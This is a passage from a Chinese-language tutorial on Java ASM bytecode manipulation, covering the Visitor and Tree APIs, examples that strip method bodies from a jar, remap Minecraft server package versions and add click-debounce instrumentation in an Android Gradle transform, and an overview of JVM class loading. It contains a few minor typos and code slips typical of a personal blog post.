visitEnd();\n}\n```\n\n在使用ClassVisitor访问类时，一旦访问到其中的属性就会回调到对应的属性的访问方法。\n\n> ###### 1：void visit(int version, int access, String name, String signature, String superName, String[] interfaces)\n>\n> 访问class的头信息\n>\n> version：class版本（编译级别）\n>\n> access： 访问标示\n>\n> name：类名称\n>\n> signature：class的签名，可能是null\n>\n> superName：超类名称\n>\n> interfaces：接口的名称\n>\n> ###### 2：void visitAnnotation(String descriptor, boolean visible)\n>\n> 访问class的注解信息\n>\n> descriptor：描述信息\n>\n> visible：是否运行时可见\n>\n> ###### 3：FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)\n>\n> 访问class中字段的信息，返回一个FieldVisitor用于获取字段中更加详细的信息。\n>\n> name：字段个的名称\n>\n> descriptor：字段的描述\n>\n> value：该字段的初始值，文档上面说：\n>\n> 该参数，其可以是零，如果字段不具有初始值，必须是一个`Integer`，一`Float`，一`Long`，一个`Double`或一个`String`（对于`int`，`float`，`long` 或`String`分别字段）。*此参数仅用于静态字段*。对于非静态字段，它的值被忽略，非静态字段必须通过构造函数或方法中的字节码指令进行初始化（但是不管我怎么试，结果都是null）。\n>\n> ###### 4：MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)\n>\n> 访问class中方法的信息，返回一个MethodVisitor用于获取方法中更加详细的信息。\n>\n> name：方法的名称\n>\n> descriptor：方法的描述\n>\n> signature：方法的签名\n>\n> exceptions：方法的异常名称\n>\n> ###### 5：visitInnerClass(String name, String outerName, String innerName, int access)\n>\n> 访问class中内部类的信息。这个内部类不一定是被访问类的成员（这里的意思是可能是一段方法中的**匿名内部类**，或者**声明在一个方法中的类**等等）。\n>\n> name：内部类的名称。例子`com/hebaibai/example/demo/Aoo$1XX`\n>\n> outerName：内部类所在类的名称\n>\n> innerName：内部类的名称\n>\n> ###### 6：visitOuterClass(String owner, String name, String descriptor)\n>\n> 访问该类的封闭类。仅当类具有封闭类时，才必须调用此方法。\n>\n> 我自己试了一下，如果在一个方法中定义了一个class，或者定义个一个匿名内部类，这时通过visitInnerClass方法能够得到例如`com/hebaibai/example/demo/Aoo$1`或者`com/hebaibai/example/demo/Aoo$1XX`的类名称。这时通过使用\n>\n> ```javascript\n> ClassReader classReader = new ClassReader(\"com/hebaibai/example/demo/Aoo$1\");\n>  classReader.accept(new DemoClassVisitor(Opcodes.ASM7), ClassReader.SKIP_CODE);\n> ```\n>\n> 复制\n>\n> 可以得到持有内部类的类信息。\n>\n> owner：拥有该类的class名称\n>\n> name：包含该类的方法的名称，如果该类未包含在其封闭类的方法中，则返回null\n>\n> descriptor：描述\n\nClassVisitor是一个抽象类，我们可以通过继承它来实现自己的ClassVisitor（MethodVistitor/FieldVisitor同)。我们可以插入一段逻辑来获取我们要访问的类的信息，也可以通过改变方法的返回值来修改类的信息。\n\n当然我们也可以直接通过ClassWriter来生成一个类，手动调用它的各种visit方法来向生成的类来写入字节码，下面我们先简简单单写个HelloWorld。\n\n```kotlin\nfun main() {\n    val classWriter = ClassWriter(0)\n    classWriter.visit(\n        V1_8,\n        ACC_PUBLIC + ACC_SUPER,\n        \"org/example/asmlearn/ASMLearn_Test\",\n        null,\n        \"java/lang/Object\",\n        null\n    )\n    val mv = classWriter.visitMethod(\n        ACC_PUBLIC + ACC_STATIC,\n        \"main\",\n        \"([Ljava/lang/String;)V\",\n        null,\n        null\n    )\n    mv.visitFieldInsn(GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\")\n    mv.visitLdcInsn(\"Hello, World!\")\n    mv.visitMethodInsn(INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false)\n    mv.visitInsn(RETURN)\n    mv.visitMaxs(2, 1)\n    mv.visitEnd()\n    classWriter.visitEnd()\n    val byteArray = classWriter.toByteArray()\n    val classLoader = MyClassLoader()\n    val clazz = classLoader.defineClass(\"org.example.asmlearn.ASMLearn_Test\", byteArray)\n    val m = clazz.getMethod(\"main\", Array<String>::class.java)\n    m.invoke(null, arrayOf(\"\"))\n}\n\nclass MyClassLoader : ClassLoader() {\n    fun defineClass(name: String, b: ByteArray): Class<*> {\n        return defineClass(name, b, 0, b.size)\n    }\n}\n```\n\n这里我们通过asm生成了一个`org/example/asmlearn/ASMLearn_Test`类，并在里面生成了一个main方法，加载到自定义的classLoader中，然后对它进行反射执行main方法。\n\n>  顺便说下生成代码的事情，编译期生成常规代码其实不推荐使用asm，我们一般只在运行期动态生成代码才使用asm。因为asm写起来比较繁琐，运行期用它来生成代码其实是因为没有更好的办法了。编译期如果不是你想实现什么魔法的话一般不用来生成代码，生成代码可以了解一下kapt和ksp，编译期asm一般只是用来在已有的代码中进行插桩。\n\n##### Tree API\n\nTree API基于Core API实现，Tree API让我们不用再自定义Visitor，我们可以直接获取一个类的ClassNode，然后通过ClassNode直接获得里面所有的方法/字段信息。\n\n那么我们要如何得到一个ClassNode呢？\n\n~~~kotlin\nfun getClassNode(clazzFile: File): ClassNode {\n    val classReader = ClassReader(clazzFile.inputStream())\n    val classNode = ClassWriter(ASM9)\n    classReader.accept(classNode, 0)\n    return classNode\n}\n~~~\n\n我们可以发现，其实ClassNode就是一个封装过的ClassVisitor。它重写了ClassVisitor所有的访问方法，在访问时把访问到的信息存到类中，然后我们就可以直接从里面获取。***有兴趣可以自己实现一下ClassNode，非常简单。***\n\n~~~kotlin\nval classNode = getClassNode(clazzFile)\n// 获取所有方法信息\nval methods: List<MethodNode> = classNode.methods\n// 获取所有字段信息\nval fields: List<FieldNode> = classNode.fields\n~~~\n\n#### 实战\n\n接下来我会讲解一些asm框架的实战用例，大家有兴趣回去可以跟着敲一敲，都不难。\n\n推荐的参考资料[Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv13433468)\n\n写的时候跟字节码和这个资料对照着看。\n\n##### ApiJarGenerator\n\n> 写这个实战的时候我还只知道Core API，所以以下功能均使用Core API实现\n\n> 我们知道，Java的类文件都是可以反编译的，同时如果要依赖于某个Jar进行开发就必须要有Jar文件。\n>\n> 设想一种情况，我们开发项目人手不够，去找了外包。同时我们有一份自主开发的框架/类库，但我们不希望这份库的Jar文件落入外包者之手，但项目开发必须要依赖这份Jar文件，否则就通不过编译，怎么办呢？\n>\n> 了解了asm框架与JVM字节码结构后我们很容易就能想出一个解决方案，删空Jar文件中所有方法的字节码指令，只留下可供调用的方法声明。这样外包者就无法通过反编译得知方法的具体逻辑，但外包者仍然能调用其中的公开方法，并且项目也能通过编译。\n\n~~~kotlin\n/**\n * org.example.asmlearn.ApiJarGenerator\n * asm-learn\n *\n * @author 寒雨\n * @since 2022/7/11 14:22\n */\nfun generate(sourceJar: File, output: File) {\n    if (!output.exists()) {\n        output.createNewFile()\n    }\n    JarOutputStream(output.outputStream()).use { out ->\n        JarFile(sourceJar).use { jarFile ->\n            for (jarEntry in jarFile.entries()) {\n                jarFile.getInputStream(jarEntry).use { input ->\n                    if (jarEntry.name.endsWith(\".class\")) {\n                        // 如果是class文件，就用我们自定义的ClassVisitor visit它\n                        val classReader = ClassReader(input)\n                        val classWriter = ClassWriter(0)\n                        val visitor = EmptyClassVisitor(classWriter)\n                        classReader.accept(visitor, 0)\n                        out.putNextEntry(JarEntry(jarEntry.name))\n                        // 写入class文件\n                        out.write(classWriter.toByteArray())\n                    } else {\n                        out.putNextEntry(JarEntry(jarEntry.name))\n                        input.copyTo(out)\n                    }\n                }\n            }\n        }\n    }\n}\n\nclass EmptyClassVisitor(visitor: ClassVisitor) : ClassVisitor(ASM9, visitor) {\n    override fun visitMethod(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        exceptions: Array<out String>?\n    ): MethodVisitor {\n        return EmptyMethodVisitor(super.visitMethod(access, name, descriptor, signature, exceptions))\n    }\n}\n\nclass EmptyMethodVisitor(methodVisitor: MethodVisitor) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitIincInsn(`var`: Int, increment: Int) {\n    }\n\n    override fun visitInsn(opcode: Int) {\n    }\n\n    override fun visitIntInsn(opcode: Int, operand: Int) {\n    }\n\n    override fun visitVarInsn(opcode: Int, `var`: Int) {\n    }\n\n    override fun visitTypeInsn(opcode: Int, type: String?) {\n    }\n\n    override fun visitJumpInsn(opcode: Int, label: Label?) {\n    }\n\n    override fun visitLabel(label: Label?) {\n    }\n\n    override fun visitLdcInsn(value: Any?) {\n    }\n\n    override fun visitTableSwitchInsn(min: Int, max: Int, dflt: Label?, vararg labels: Label?) {\n    }\n\n    override fun visitLookupSwitchInsn(dflt: Label?, keys: IntArray?, labels: Array<out Label>?) {\n    }\n\n    override fun visitMultiANewArrayInsn(descriptor: String?, numDimensions: Int) {\n    }\n\n    override fun visitTryCatchBlock(start: Label?, end: Label?, handler: Label?, type: String?) {\n    }\n\n    override fun visitLocalVariable(name: String?, descriptor: String?, signature: String?, start: Label?, end: Label?, index: Int) {\n    }\n\n    override fun visitLineNumber(line: Int, start: Label?) {\n    }\n\n    override fun visitFrame(type: Int, numLocal: Int, local: Array<out Any>?, numStack: Int, stack: Array<out Any>?) {\n    }\n\n    override fun visitFieldInsn(opcode: Int, owner: String?, name: String?, descriptor: String?) {\n    }\n\n    override fun visitMethodInsn(opcode: Int, owner: String?, name: String?, descriptor: String?) {\n    }\n\n    override fun visitMethodInsn(opcode: Int, owner: String?, name: String?, descriptor: String?, isInterface: Boolean) {\n    }\n\n    override fun visitInvokeDynamicInsn(name: String?, descriptor: String?, bootstrapMethodHandle: Handle?, vararg bootstrapMethodArguments: Any?) {\n    }\n}\n\nfun main() {\n    generate(\n        File(\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-2.21.13-J8-jar-with-dependencies.jar\"), \t\t                         File(\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-empty.jar\")\n    )\n}\n~~~\n\n上面我们让EmptyClassVisitor在visitMethod返回了一个我们自定义的EmptyMethodVisitor，也就是说在访问方法时执行的是在EmptyMethodVisitor中我们自定义的逻辑。而在EmptyMethodVisitor中我们重写了所有方法，把原本的执行父类方法的逻辑删除。这样在访问时便不会想原本一样生成跟之前一样的字节码，而是什么都不做，这样就删掉了方法中方法体的字节码。\n\n##### ASMVersionControl\n\n> 这是在Minecraft服务端插件开发经常中遇见的问题\n>\n> 众所周知，目前主流的minecraft服务端都是第三方反编译官方服务端的代码后对其进行封装而来的，而作为服务端插件开发者，我们大部分时候只需要用到第三方封装的API，但也有例外。\n>\n> 当我们需要调用官方服务端的代码，我们会发现一个问题：不同版本的服务端的官方服务端代码的包名不一样，它们被版本号分隔开来。\n>\n> 比如，在Minecraft 1.16.5版本的官方代码中，所有类都在`net.minecraft.server.v1_16_R3`包下\n>\n> 但在Minecraft 1.12.2版本的代码中，所有类都在`net.minecraft.server.v1_12_R1`包下\n>\n> 关键是它们之间的代码其实没有很大的改动，就是包名不一样了\n>\n> 考虑到版本兼容问题，开发者一般不会直接调用`n.m.s`包下的代码，在ASMVersionControl这个解决方案诞生之前，一般有两种解决方案\n>\n> - 运行时获取版本号，然后拼接字符串通过反射调用\n> - 为不同版本写多份代码，再在运行时判断当前运行版本来决定调用哪一份\n>\n> 这两种解决方案都不太尽人意。反射调用不仅麻烦，还会导致额外的性能开销。而编写多份代码更是白白增加了开发者的工作量，而且需要导入多个版本的服务端核心依赖，导包的时候及其容易导错。\n>\n> 这时候`ASMVersionControl`应运而生，开发者只需要在一个实现类中写一份代码，便可以通过ASM动态代理得到一个实例。开发者可以放心调用实例中的方法，因为这个实例已经被asm修改过了，所有`n.m.s`调用的包名的版本号部分全部被修改为了运行环境的版本号。\n\n这部分逻辑其实ASM已经提供了一个现成的工具`ClassRemapper`来实现，但它本质上也是一个被封装过的`ClassVisitor`，为了方便理解，我们使用ClassVisitor实现。\n\n如果你想知道使用ClassRemapper如何实现，看这里[taboolib/MinecraftRemapper.kt at master · TabooLib/taboolib (github.com)](https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt)\n\n或者你也可以试着自己实现一下ClassRemapper的封装，比较简单。\n\n我们先模拟两个“不同版本”下的类，也就是包名不同，但方法声明相同，实现略有不同的两个类。\n\n~~~java\n// net.minecraft.server.v1_12_R1\npublic class Test {\n    public void test() {\n        System.out.println(\"execute successfully v1.12\");\n    }\n}\n// net.minecraft.server.v1_16_R3\npublic class Test {\n    public void test() {\n        System.out.println(\"execute successfully v1.16\");\n    }\n}\n~~~\n\n理想的状态是，我要让我调用`net.minecraft.server.v1_12_R1`的所有方法全部变成`net.minecraft.server.v1_16_R3`。\n\n我们先写一段伪代码\n\n~~~kotlin\nimport net.minecraft.server.v1_12_R1.Test\n\ninterface NMSHandler {\n    fun callTest()\n}\n\nclass NMSHandlerImpl : NMSHandler {\n    override fun callTest() {\n        Test().test()\n    }\n}\n\nfun main() {\n    // 获得asm修改过的代理对象\n    val nmsProxy: NMSHandler = createProxyInstance<NMSHandler>()\n    nmsProxy.callTest() // 这里输出 execute successfully v1.16, 说明我们修改成功了\n}\n~~~\n\n我们先看看`NMSHandlerImpl#callTest`的字节码指令\n\n>    L0\n>     LINENUMBER 85 L0\n>     NEW net/minecraft/server/v1_12_R1/Test\n>     DUP\n>     INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V\n>     INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V\n>    L1\n>     LINENUMBER 86 L1\n>     RETURN\n>    L2\n>     LOCALVARIABLE this Lorg/example/asmlearn/NMSHandlerImpl; L0 L2 0\n>     MAXSTACK = 2\n>     MAXLOCALS = 1\n\n我们只需要修改其中所有的 `net/minecraft/server/v1_12_R1/Test`为`net/minecraft/server/v1_16_R3/Test`即可，目前为止我们知道我们肯定首先要先visitMethod，然后在具体的操作方法。\n\n> 需要修改的指令：\n>\n> - NEW net/minecraft/server/v1_12_R1/Test\n>\n> - INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V\n>\n> - INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V\n\n在[Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv13433468)对照\n\n发现我们只需要重写`visitTypeInsn`, `visitMethodInsn`，并在里面替换对应的参数即可。\n\n~~~kotlin\nclass VersionControlMethodVisitor(methodVisitor: MethodVisitor, private val currentVersion: String) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitTypeInsn(opcode: Int, type: String) {\n        super.visitTypeInsn(opcode, type.modifyVersion(currentVersion))\n    }\n\n    override fun visitMethodInsn(\n        opcode: Int,\n        owner: String,\n        name: String,\n        descriptor: String,\n        isInterface: Boolean\n    ) {\n        super.visitMethodInsn(opcode, owner.modifyVersion(currentVersion), name, descriptor, isInterface)\n    }\n}\n~~~\n\n完整代码如下:\n\n~~~kotlin\nimport net.minecraft.server.v1_12_R1.Test\n\nclass VersionControlClassVisitor(classVisitor: ClassVisitor, val currentVersion: String) : ClassVisitor(ASM9, classVisitor) {\n    override fun visitField(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        value: Any?\n    ): FieldVisitor {\n        return VersionControlFieldVisitor(super.visitField(access, name, descriptor, signature, value), currentVersion)\n    }\n\n    override fun visitMethod(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        exceptions: Array<out String>?\n    ): MethodVisitor {\n        return VersionControlMethodVisitor(super.visitMethod(access, name, descriptor, signature, exceptions), currentVersion)\n    }\n}\n\nclass VersionControlMethodVisitor(methodVisitor: MethodVisitor, private val currentVersion: String) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitTypeInsn(opcode: Int, type: String) {\n        super.visitTypeInsn(opcode, type.modifyVersion(currentVersion))\n    }\n\n    override fun visitMethodInsn(\n        opcode: Int,\n        owner: String,\n        name: String,\n        descriptor: String,\n        isInterface: Boolean\n    ) {\n        super.visitMethodInsn(opcode, owner.modifyVersion(currentVersion), name, descriptor, isInterface)\n    }\n}\n\nclass VersionControlFieldVisitor(fieldVisitor: FieldVisitor, val currentVersion: String) : FieldVisitor(ASM9, fieldVisitor) {\n\n}\n\nval nms = \"net/minecraft/server/v1_.*?/\".toRegex()\nval obc = \"org/bukkit/craftbukkit/v1_.*?/\".toRegex()\n\nfun String.modifyVersion(version: String): String {\n    return this.replace(nms, \"net/minecraft/server/$version/\")\n        .replace(obc, \"org/bukkit/craftbukkit/$version/\")\n}\n\n@Suppress(\"UNCHECKED_CAST\")\ninline fun <reified T> createProxyClass(impl: String = T::class.java.name + \"Impl\"): Class<T> {\n    val input = VersionControlClassVisitor::class.java.classLoader.getResourceAsStream(impl.replace(\".\", \"/\") + \".class\")\n    val classReader = ClassReader(input)\n    val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)\n    classReader.accept(VersionControlClassVisitor(classWriter, \"v1_16_R3\"), 0)\n    return MyClassLoader.defineClass(impl, classWriter.toByteArray()) as Class<T>\n}\n\ninline fun <reified T> createProxyInstance(impl: String = T::class.java.name + \"Impl\"): T {\n    return createProxyClass<T>(impl).getDeclaredConstructor().newInstance()\n}\n\ninterface NMSHandler {\n    fun callTest()\n}\n\nclass NMSHandlerImpl : NMSHandler {\n    override fun callTest() {\n        Test().test()\n    }\n}\n\nfun main() {\n    val proxy = createProxyInstance<NMSHandler>()\n    proxy.callTest()\n}\n~~~\n\n上面这段代码的运行结果是`execute successfully v1.16`,证明我们成功替换了代理类中的包名。\n\n其实gradle插件shadowJar重定向(relocate)包名的功能的实现也大同小异，大家有兴趣可以课下自己去实现一下。\n\n##### 字节码插桩\n\n前面几个其实并不是我们安卓开发经常遇到的问题，只是它们解决起来相对简单。安卓开发中asm框架主要是用来字节码插桩的。\n\n字节码插桩其实是hook的一种。\n\n这个我们就不自己写了，我们分析一下大佬写的案例——用字节码插桩实现双击防抖。\n\n先贴下源码链接: [leavesCZY/ASM_Transform: ASM Transform 字节码插桩实战 (github.com)](https://github.com/leavesCZY/ASM_Transform)\n\n谷歌为android量身定制了安卓字节码插桩的解决方案`transform api`来配合gradle使用，***不过它现在已经即将废弃了，最新的解决方案是Gradle提供的TransformAction***，不过这里我们要看的源码仍然是使用transform api来实现字节码插桩，不过问题不大。\n\n###### gradle插件编写\n\n> 字节码插桩一般都是通过自定义gradle插件干预编译实现的\n>\n> 准确来说是在编译后再对编译产物处理一遍\n\n首先我们新建一个`buildSrc`模块，`buildSrc`模块中的代码可以在其他模块的build.gradle中直接引入使用。\n\n然后创建一个插件类\n\n~~~kotlin\n/**\n * @Author: leavesCZY\n * @Date: 2021/12/2 16:02\n * @Desc:\n */\nclass DoubleClickPlugin : Plugin<Project> {\n\n    override fun apply(project: Project) {\n        val config = DoubleClickConfig()\n        val appExtension: AppExtension = project.extensions.getByType()\n        appExtension.registerTransform(DoubleClickTransform(config))\n    }\n\n}\n~~~\n\n其中apply是在你导入这个插件时执行的逻辑，我们在apply方法中注册了我们写的Transform，在编译时便会执行Transform的对应逻辑。\n\n然后我们只需要在需要使用这个插件的模块导入并apply就可以了\n\n~~~groovy\nimport github.leavesczy.asm.plugins.doubleClick.DoubleClickPlugin\n\napply plugin: DoubleClickPlugin\n~~~\n\n###### transform逻辑\n\n我们先来看看`DoubleClickTransform`中的内容\n\n~~~kotlin\nclass DoubleClickTransform(private val config: DoubleClickConfig) : BaseTransform() {\n\n    private companion object {\n\n        private const val ViewDescriptor = \"Landroid/view/View;\"\n\n        private const val OnClickViewMethodDescriptor = \"(Landroid/view/View;)V\"\n\n        private const val ButterKnifeOnClickAnnotationDesc = \"Lbutterknife/OnClick;\"\n\n        private val MethodNode.onlyOneViewParameter: Boolean\n            get() = desc == OnClickViewMethodDescriptor\n\n        private fun MethodNode.hasCheckViewAnnotation(config: DoubleClickConfig): Boolean {\n            return hasAnnotation(config.formatCheckViewOnClickAnnotation)\n        }\n\n        private fun MethodNode.hasUncheckViewOnClickAnnotation(config: DoubleClickConfig): Boolean {\n            return hasAnnotation(config.formatUncheckViewOnClickAnnotation)\n        }\n\n        private fun MethodNode.hasButterKnifeOnClickAnnotation(): Boolean {\n            return hasAnnotation(ButterKnifeOnClickAnnotationDesc)\n        }\n\n    }\n\n    override fun modifyClass(byteArray: ByteArray): ByteArray {\n        val classReader = ClassReader(byteArray)\n        val classNode = ClassNode()\n        classReader.accept(classNode, ClassReader.EXPAND_FRAMES)\n        val methods = classNode.methods\n        if (!methods.isNullOrEmpty()) {\n            val shouldHookMethodList = mutableSetOf<String>()\n            for (methodNode in methods) {\n                //静态、包含 UncheckViewOnClick 注解的方法不用处理\n                if (methodNode.isStatic ||\n                    methodNode.hasUncheckViewOnClickAnnotation(config)\n                ) {\n                    continue\n                }\n                val methodNameWithDesc = methodNode.nameWithDesc\n                if (methodNode.onlyOneViewParameter) {\n                    if (methodNode.hasCheckViewAnnotation(config)) {\n                        //添加了 CheckViewOnClick 注解的情况\n                        shouldHookMethodList.add(methodNameWithDesc)\n                        continue\n                    } else if (methodNode.hasButterKnifeOnClickAnnotation()) {\n                        //使用了 ButterKnife，且当前 method 添加了 OnClick 注解\n                        shouldHookMethodList.add(methodNameWithDesc)\n                        continue\n                    }\n                }\n                if (classNode.isHookPoint(config, methodNode)) {\n                    shouldHookMethodList.add(methodNameWithDesc)\n                    continue\n                }\n                //判断方法内部是否有需要处理的 lambda 表达式\n                val invokeDynamicInsnNodes = methodNode.findHookPointLambda(config)\n                invokeDynamicInsnNodes.forEach {\n                    val handle = it.bsmArgs[1] as? Handle\n                    if (handle != null) {\n                        shouldHookMethodList.add(handle.name + handle.desc)\n                    }\n                }\n            }\n            if (shouldHookMethodList.isNotEmpty()) {\n                for (methodNode in methods) {\n                    val methodNameWithDesc = methodNode.nameWithDesc\n                    if (shouldHookMethodList.contains(methodNameWithDesc)) {\n                        val argumentTypes = Type.getArgumentTypes(methodNode.desc)\n                        val viewArgumentIndex = argumentTypes?.indexOfFirst {\n                            it.descriptor == ViewDescriptor\n                        } ?: -1\n                        if (viewArgumentIndex >= 0) {\n                            val instructions = methodNode.instructions\n                            if (instructions != null && instructions.size() > 0) {\n                                val list = InsnList()\n                                list.add(\n                                    VarInsnNode(\n                                        Opcodes.ALOAD, getVisitPosition(\n                                            argumentTypes,\n                                            viewArgumentIndex,\n                                            methodNode.isStatic\n                                        )\n                                    )\n                                )\n                                list.add(\n                                    MethodInsnNode(\n                                        Opcodes.INVOKESTATIC,\n                                        config.formatDoubleCheckClass,\n                                        config.doubleCheckMethodName,\n                                        config.doubleCheckMethodDescriptor\n                                    )\n                                )\n                                val labelNode = LabelNode()\n                                list.add(JumpInsnNode(Opcodes.IFNE, labelNode))\n                                list.add(InsnNode(Opcodes.RETURN))\n                                list.add(labelNode)\n                                instructions.insert(list)\n                            }\n                        }\n                    }\n                }\n                val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)\n                classNode.accept(classWriter)\n                return classWriter.toByteArray()\n            }\n        }\n        return byteArray\n    }\n\n    private fun ClassNode.isHookPoint(config: DoubleClickConfig, methodNode: MethodNode): Boolean {\n        val myInterfaces = interfaces\n        if (myInterfaces.isNullOrEmpty()) {\n            return false\n        }\n        val extraHookMethodList = config.hookPointList\n        extraHookMethodList.forEach {\n            if (myInterfaces.contains(it.interfaceName) && methodNode.nameWithDesc == it.methodSign) {\n                return true\n            }\n        }\n        return false\n    }\n\n    private fun MethodNode.findHookPointLambda(config: DoubleClickConfig): List<InvokeDynamicInsnNode> {\n        val onClickListenerLambda = findLambda {\n            val nodeName = it.name\n            val nodeDesc = it.desc\n            val find = config.hookPointList.find { point ->\n                nodeName == point.methodName && nodeDesc.endsWith(point.interfaceSignSuffix)\n            }\n            return@findLambda find != null\n        }\n        return onClickListenerLambda\n    }\n\n    override fun getInputTypes(): Set<QualifiedContent.ContentType> {\n        return TransformManager.CONTENT_CLASS\n    }\n\n    override fun getScopes(): MutableSet<in QualifiedContent.Scope> {\n        return mutableSetOf(\n            QualifiedContent.Scope.PROJECT,\n            QualifiedContent.Scope.SUB_PROJECTS,\n//            QualifiedContent.Scope.EXTERNAL_LIBRARIES\n        )\n    }\n\n}\n~~~\n\n他自己封装了一个`BaseTransform`，把修改class的过程封装成了一个`modifierClass(byteArray: ByteArray): ByteArray`方法，让我们能更专注于修改类信息的过程。至于他是怎么封装的也可以课下了解，这里我们着重讲他如何使用asm。\n\n我们首先分析他的逻辑，无外乎两点：\n\n- 找到hook点（ButterKnife的onClick注解，View#setOnClickListener）\n- 在hook点插入逻辑代码\n\n> 这里自由发挥吧，随便讲点就差不多了。\n\n## 虚拟机类加载机制\n\n![13202633-3cb11d1712a9efc9](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp)\n\n### 类的生命周期\n\n#### 加载 Loading\n\n> 虚拟机从io流读取类文件到内存中。\n>\n> 加载过程主要完成三件事情：\n>\n> 1. 通过类的全限定名来获取定义此类的二进制字节流\n> 2. 将这个类字节流代表的静态存储结构转为方法区的运行时数据结构\n> 3. 在堆中生成一个代表此类的java.lang.Class对象，作为访问方法区这些数据结构的入口。\n>\n> 这个过程主要就是类加载器完成。\n\n#### 验证 Verification\n\n> 此阶段主要确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机的自身安全。\n>\n> 1. 文件格式验证：基于字节流验证。\n> 2. 元数据验证：基于***方法区***的存储结构验证。\n> 3. 字节码验证：基于方法区的存储结构验证。\n> 4. 符号引用验证：基于方法区的存储结构验证。\n\n#### 准备 Preparation\n\n> 为类变量分配内存，并将其初始化为默认值。（此时为默认值，在初始化的时候才会给变量赋值）即在方法区中分配这些变量所使用的内存空间\n\n例如\n\n~~~java\npublic class Main {\n    public static int value = 12345;\n}\n~~~\n\n虽说value在代码中被初始化为5，但这时value的值仍然为0，变量要在初始化阶段才会被赋初值（如果有）。\n\n#### 解析 Resolution\n\n> 把类型中的符号引用转换为直接引用。\n>\n> - 符号引用与虚拟机实现的布局无关，引用的目标并不一定要已经加载到内存中。各种虚拟机实现的内存布局可以各不相同，但是它们能接受的符号引用必须是一致的，因为符号引用的字面量形式明确定义在Java虚拟机规范的Class文件格式中。\n> - 直接引用可以是指向目标的指针，相对偏移量或是一个能间接定位到目标的句柄。如果有了直接引用，那引用的目标必定已经在内存中存在\n>\n> 主要有以下四种：\n>\n> - 类或接口的解析\n> - 字段解析\n>\n> - 类方法解析\n>\n> - 接口方法解析\n\n#### 初始化 Initialization\n\n> 初始化阶段是执行类构造器<client>方法的过程。<client>方法是由编译器自动收集类中的类变量的赋值操作和静态语句块中的语句合并而成的。虚拟机会保证<client>方法执行之前，父类的<client>方法已经执行完毕。如果一个类中没有对静态变量赋值也没有静态语句块，那么编译器可以不为这个类生成<client>()方法。\n>\n> java中，对于初始化阶段，有且只有以下五种情况才会对要求类立刻“初始化”（加载，验证，准备，自然需要在此之前开始）：\n>\n> - 使用new关键字实例化对象、访问或者设置一个类的静态字段（被final修饰、编译器优化时已经放入常量池的例外）、调用类方法，都会初始化该静态字段或者静态方法所在的类。\n>\n> - 初始化类的时候，如果其父类没有被初始化过，则要先触发其父类初始化。\n>\n> - 使用java.lang.reflect包的方法进行反射调用的时候，如果类没有被初始化，则要先初始化。\n>\n> - 虚拟机启动时，用户会先初始化要执行的主类（含有main）\n>\n> - jdk 1.7后，如果java.lang.invoke.MethodHandle的实例最后对应的解析结果是 REF_getStatic、REF_putStatic、REF_invokeStatic方法句柄，并且这个方法所在类没有初始化，则先初始化。\n\n#### 卸载 Unloading\n\n> 在栈中不存在该类的实例与Class对象，且加载该类的classLoader失去gc roots时，换言之该类已经失去了gc roots，被gc回收，此时可以称作该类成功从jvm中卸载了，这条机制也是一些热修复方案的实现原理(其实现在大部分的热修复都是用JavaAgent实现类的热替换）。\n\n### 类加载器 (ClassLoader)\n\n#### 各司其职\n\nJVM 运行实例中会存在多个 ClassLoader，不同的 ClassLoader 会从不同的地方加载字节码文件。它可以从不同的文件目录加载，也可以从不同的 jar 文件中加载，也可以从网络上不同的服务地址来加载。\n\nJVM 中内置了三个重要的 ClassLoader，分别是 BootstrapClassLoader、ExtensionClassLoader 和 AppClassLoader。\n\nBootstrapClassLoader 负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.xxx.* 都在里面，比如 java.util.*、java.io.*、java.nio.*、java.lang.* 等等。这个 ClassLoader 比较特殊，它是由 C 代码实现的，我们将它称之为「根加载器」。\n\nExtensionClassLoader 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，有很多 jar 包。\n\nAppClassLoader 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的。\n\n那些位于网络上静态文件服务器提供的 jar 包和 class文件，jdk 内置了一个 URLClassLoader，用户只需要传递规范的网络路径给构造器，就可以使用 URLClassLoader 来加载远程类库了。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。\n\nAppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到，它就是我们所说的「系统类加载器」，我们用户平时编写的类代码通常都是由它加载的。当我们的 main 方法执行的时候，这第一个用户类的加载器就是 AppClassLoader。\n\n#### ClassLoader 